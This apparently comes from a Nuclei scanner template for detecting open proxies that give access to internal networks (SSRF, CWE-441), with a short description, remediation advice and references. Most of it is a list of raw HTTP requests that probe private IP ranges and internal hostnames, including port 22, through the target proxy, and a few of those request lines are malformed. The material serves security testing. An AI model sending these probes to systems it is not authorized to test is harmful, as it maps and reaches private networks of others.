# Nuclei Template: Open Proxy To Internal Network
**Template ID:** open-proxy-internal
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** High
**CWE:** CWE-441
**Source:** Nuclei Template (`open-proxy-internal.yaml`)

## Vulnerability Information & PoC

## Description
The host is configured as a proxy which allows access to other hosts on the internal network.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET http://192.168.0.1/ HTTP/1.1
Host: 192.168.0.1

GET https://192.168.0.1/ HTTP/1.1
Host: 192.168.0.1

GET http://192.168.0.1:22/ HTTP/1.1
Host: 192.168.0.1

GET http://192.168.1.1/ HTTP/1.1
Host: 192.168.1.1

GET https://192.168.1.1/ HTTP/1.1
Host: 192.168.1.1

GET http://192.168.1.1:22/ HTTP/1.1
Host: 192.168.1.1

GET http://192.168.2.1/ HTTP/1.1
Host: 192.168.2.1

GET https://192.168.2.1/ HTTP/1.1
Host: 192.168.2.1

GET http://192.168.2.1:22/ HTTP/1.1
Host: 192.168.2.1

GET http:/10.0.0.1/ HTTP/1.1
Host: 10.0.0.1

GET https://10.0.0.1/ HTTP/1.1
Host: 10.0.0.1

GET http://10.0.0.1:22/ HTTP/1.1
Host: 10.0.0.1

GET http:/172.16.0.1/ HTTP/1.1
Host: 172.16.0.1

GET https://172.16.0.1/ HTTP/1.1
Host: 172.16.0.1

GET http://172.16.0.1:22/ HTTP/1.1
Host: 172.16.0.1

GET http:/intranet/ HTTP/1.1
Host: intranet

GET https://intranet/ HTTP/1.1
Host: intranet

GET http://intranet:22/ HTTP/1.1
Host: intranet

GET http:/mail/ HTTP/1.1
Host: mail

GET https://mail/ HTTP/1.1
Host: mail

GET http://mail:22/ HTTP/1.1
Host: mail

GET http:/ntp/ HTTP/1.1
Host: ntp

GET https://ntp/ HTTP/1.1
Host: ntp

GET http://ntp:22/ HTTP/1.1
Host: ntp
```

## Remediation
Disable the proxy or restrict configuration to only allow access to approved hosts/ports.

## References
- https://blog.projectdiscovery.io/abusing-reverse-proxies-internal-access/
- https://en.wikipedia.org/wiki/Open_proxy
- https://www.acunetix.com/vulnerabilities/web/apache-configured-to-run-as-proxy/
